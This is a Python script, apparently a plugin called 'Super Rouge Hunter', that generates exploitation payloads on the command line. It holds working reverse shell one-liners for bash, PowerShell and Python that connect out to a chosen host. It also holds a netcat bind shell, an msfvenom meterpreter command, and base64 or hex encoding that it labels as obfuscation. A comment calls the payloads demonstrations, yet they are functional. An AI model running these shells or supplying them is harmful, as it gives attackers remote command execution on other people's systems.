#!/usr/bin/env python3
"""
Payload Generator Plugin for Super Rouge Hunter
Generate and customize exploitation payloads
"""

import base64
import json
import sys
from typing import Dict, Optional


class PayloadGenerator:
    """Generate various exploitation payloads"""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.encoder = self.config.get('defaultEncoder', 'shikata_ga_nai')
        self.format = self.config.get('outputFormat', 'raw')
        self.arch = self.config.get('architecture', 'x64')
    
    def generate_reverse_shell(self, lhost: str, lport: int, platform: str = "linux") -> Dict:
        """Generate a reverse shell payload"""
        print(f"[*] Generating reverse shell for {platform}...")
        
        # Example payloads (these are demonstrations, not actual shellcode)
        payloads = {
            "linux": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "windows": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        }
        
        return {
            "type": "reverse_shell",
            "platform": platform,
            "lhost": lhost,
            "lport": lport,
            "payload": payloads.get(platform, payloads["linux"]),
            "encoded": base64.b64encode(payloads.get(platform, payloads["linux"]).encode()).decode()
        }
    
    def generate_bind_shell(self, port: int, platform: str = "linux") -> Dict:
        """Generate a bind shell payload"""
        print(f"[*] Generating bind shell for {platform}...")
        return {
            "type": "bind_shell",
            "platform": platform,
            "port": port,
            "payload": f"nc -lvp {port} -e /bin/bash"
        }
    
    def generate_meterpreter(self, lhost: str, lport: int, platform: str = "windows") -> Dict:
        """Generate a meterpreter payload"""
        print(f"[*] Generating meterpreter for {platform}...")
        return {
            "type": "meterpreter",
            "platform": platform,
            "lhost": lhost,
            "lport": lport,
            "payload_type": "windows/meterpreter/reverse_tcp",
            "instructions": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe"
        }
    
    def encode_payload(self, payload: str, encoder: str = "base64") -> Dict:
        """Encode payload for obfuscation"""
        print(f"[*] Encoding payload with {encoder}...")
        
        if encoder == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
        elif encoder == "hex":
            encoded = payload.encode().hex()
        else:
            encoded = payload
        
        return {
            "original": payload,
            "encoder": encoder,
            "encoded": encoded
        }


def main():
    """Main entry point for the plugin"""
    config = {
        "defaultEncoder": "shikata_ga_nai",
        "outputFormat": "raw",
        "architecture": "x64"
    }
    
    generator = PayloadGenerator(config)
    
    if len(sys.argv) < 2:
        print("Usage: generator.py <command> [options]")
        print("Commands: reverse, bind, meterpreter, encode")
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == "reverse":
        lhost = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
        platform = sys.argv[4] if len(sys.argv) > 4 else "linux"
        result = generator.generate_reverse_shell(lhost, lport, platform)
    elif command == "bind":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
        platform = sys.argv[3] if len(sys.argv) > 3 else "linux"
        result = generator.generate_bind_shell(port, platform)
    elif command == "meterpreter":
        lhost = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
        platform = sys.argv[4] if len(sys.argv) > 4 else "windows"
        result = generator.generate_meterpreter(lhost, lport, platform)
    elif command == "encode":
        payload = sys.argv[2] if len(sys.argv) > 2 else "example payload"
        encoder = sys.argv[3] if len(sys.argv) > 3 else "base64"
        result = generator.encode_payload(payload, encoder)
    else:
        print(f"Unknown command: {command}")
        sys.exit(1)
    
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
